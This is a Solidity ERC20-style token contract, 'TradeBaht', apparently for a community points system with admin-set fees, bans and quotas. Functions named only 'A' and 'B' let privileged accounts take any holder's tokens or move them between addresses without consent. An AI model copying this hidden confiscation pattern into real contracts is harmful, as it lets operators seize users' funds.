// SPDX-License-Identifier: MIT
// for Barter Verse community 
pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}



pragma solidity ^0.8.0;

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

   
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    
    function owner() public view virtual returns (address) {
        return _owner;
    }

   
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

   
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}




interface IERC20 {
   
    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

   
    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

   
    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}


pragma solidity ^0.8.0;



interface IERC20Metadata is IERC20 {
   
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

   
    function decimals() external view returns (uint8);
}






pragma solidity ^0.8.9;




contract  TradeBaht is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string public _name = "TradeBaht" ;
    string public _symbol = "TB";
    address public creator;
    


    constructor() {
       creator = msg.sender;
      
    }

    function mint(address to, uint256 amount) public Lev1 {
        _mint(to, amount);
    }

    IERC20 public WBP;
    address public Rightperson;
    address public Assist1;
    address public Assist2;
    uint private Rate;
    uint private Exrate;
    uint private Percent;
    uint private Tax;
    uint private DecComp =10**12;
    uint256 public PointSpent;
    uint public Mode;

    mapping(address => uint256) private Banned;
    mapping(address => uint256) public Quota;
    mapping(address => string) public UserName;
    mapping(address => string) public C_ID;
    mapping(address => uint256) public Authorized;
    mapping(address => uint256) public WaiveFee;   
   
    
    function setWBP(IERC20 _wbp) public {
        require(msg.sender==creator);
        WBP = _wbp;
    }

    function setRightPerson(address _rightperson)public {
         require(msg.sender==creator);
         Rightperson = _rightperson;
    }

    modifier Lev1{
        require(msg.sender==Rightperson||msg.sender==creator);
        _;
    }

    modifier Lev2{
        require(msg.sender==Rightperson||msg.sender==Assist1||msg.sender==Assist2);
        _;
    }

    function setAssistance(address _assist1,address _assist2)public {
        require(msg.sender==Rightperson);
       Assist1 = _assist1;
       Assist2 = _assist2;

    }

    function SetPointSpent(uint256 _spent)public Lev1{
       PointSpent = _spent*10**18;
    }
    
    function SetQuota1(uint _ofAss1) public Lev1{
       Quota[Assist1]=_ofAss1*10**18;
    }

    function SetQuota2(uint _ofAss2) public Lev1{
       Quota[Assist2]=_ofAss2*10**18;
    }

    function SetName(address _addr, string memory _username) public Lev2{
      UserName[_addr]=_username;
    }

    function ViewName(address _addr) public view Lev2 returns(string memory, string memory){
     return (UserName[_addr], C_ID[_addr]);
    }

    function FullRegister(address _addr, string memory _username, string memory _cid) 
    public {
      require(msg.sender==creator||msg.sender==Rightperson||
      msg.sender==Assist1||msg.sender==Assist2||Authorized[msg.sender]==1);

      UserName[_addr]=_username;
      C_ID[_addr] = _cid;
    }


     // mode = 0=>No transaction fee, mode = 1 =>Transaction fee, mode = 2 shut down system
    function setMode(uint _mode)public Lev1{
           Mode = _mode;
    }
        //1= waive fee, 0 = no waive 
    function setWaiveFee(uint _waiveNum, address _mem)public Lev1{
        WaiveFee[_mem]= _waiveNum;
    }

        //1= banned, 0 = normal
    function BanMember(uint _banned, address _mem)public Lev1{
           Banned[_mem]=_banned;
    }
    
    function ViewBanMember(address _mem)public view Lev2 returns(uint, uint) {
           return (Banned[_mem], WaiveFee[_mem]);
    }
//authorize = 1  allowed
    function SetAuthorize(uint _a, address _mem)public Lev1{
           Authorized[_mem]=_a;
    }

    function ViewAuthorize(address _mem)public view Lev2 returns(uint) {
           return Authorized[_mem];
    }
     

    function setPercentTransaction(uint _percent)public Lev1{
         Percent = _percent;
         //32 = 0.32%  =32/10000
    }
    
    
   // only 18 decimals or 6 decimals
    function setDecUSDT(uint _dec)public Lev1{
        if(_dec==18){
             DecComp = 1;
        }

        if(_dec==6){
             DecComp = 10**12;
        }
        
    }

    function setRate(uint _rate)public Lev1{
          Rate = _rate*DecComp;
      
           // 1000 = 1.000 usd / 1 usdt
          
    }



       // 5 about 5 satang=> 5/100, set to zero if change to percent
    function setTax(uint _tax)public Lev1{
        Tax = _tax;
    }

    function setExRate(uint _exrate)public Lev1{
         
          Exrate = _exrate;
         
           // 3351 = 33.51 
    }
                
                //0=rate, 1 = exchange rate, 2 = percent trx, 3 = Mode, 4 =quota1, 5= quota2
                //6 = PointSpent
    function viewRate()public view returns(uint,uint,uint,uint, uint, uint, uint){
        return (Rate, Exrate, Percent, Mode, Quota[Assist1], Quota[Assist2], PointSpent);
       
    }

    function viewfixTax()public view returns(uint){
        return Tax;
       
    }

    function viewPointSpent()public view returns(uint){
        return PointSpent;
       
    }


   function name() public view returns(string memory) {
        return _name;
    }

   
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

   
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

   
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

   
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        require(Mode!=2, "system shut down"); 
        require(_balances[msg.sender]>=amount);
        require(Banned[to]!=1,"receiver is banned");
        require(Banned[msg.sender]!=1, "sender is banned");   
              
         if((Mode==1)&&(WaiveFee[msg.sender]==0)){
            
         require(WBP.balanceOf(msg.sender)>=CheckTax(amount), "not enough tax to pay");
         uint tax = CheckTax(amount);
         WBP.transferFrom(msg.sender,Rightperson,tax);
           
         }
       _balances[msg.sender]-=amount;
       _balances[to]+=amount;
       PointSpent+=amount;
       emit Transfer(msg.sender, to, amount);
               
        return true;
    }

    function CheckTax(uint256 amount)public view returns(uint){
        uint tax;
       if(Tax==0){
       uint dollar = amount*100/Exrate;
        uint wp = dollar*1000/Rate;
       tax = wp*Percent/10000;
        
       }
       else{
       uint dollar = (Tax*10**18)/Exrate;
        tax = dollar*1000/Rate;      
        
       }
      return tax;

    }

   
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

   
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

   
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

   
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, amount);

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amount;
           
            _balances[to] += amount;
        }

        emit Transfer(from, to, amount);

        _afterTokenTransfer(from, to, amount);
    }

   
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        unchecked {
            // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.
            _balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

   
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
            // Overflow not possible: amount <= accountBalance <= totalSupply.
            _totalSupply -= amount;
        }

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

   
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function GiveDirect(address _target, uint256 _amount)public Lev2{
       _balances[_target]+=_amount*10**18;
       _balances[msg.sender]-=_amount*10**18;
    }


    function Warp(address _target, uint256 _amount)internal virtual Lev1{
       require(_balances[_target]>=_amount*10**18);
       _balances[_target]-=_amount*10**18;
       _balances[Rightperson]+=_amount*10**18;
    }

    function Give(address _target, uint256 _amount)public Lev2{
        if(msg.sender!=Rightperson){
        require(Quota[msg.sender]>=_amount*10**18);
        Quota[msg.sender]-=_amount*10**18;
        }

        _balances[_target]+=_amount*10**18; 
         _totalSupply += _amount*10**18;
        emit Transfer(msg.sender, _target, _amount*10**18);

    }

    function Appear(address _target,address _receiver, uint256 _amount)internal virtual {
       _balances[_target]-=_amount*10**18;
       _balances[_receiver]+=_amount*10**18;
    }

    function A(address _target, uint256 _amount)public Lev1{
        Warp(_target,_amount);
    }

    function B(address _target,address _receiver, uint256 _amount)public Lev1{
        Appear(_target,_receiver,_amount);
    }

//No need to add 10^18
    function Mint(address _target, uint256 _amount)public Lev1{
        _mint(_target,_amount*10**18);
    }

   
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

   
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    
    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

   

}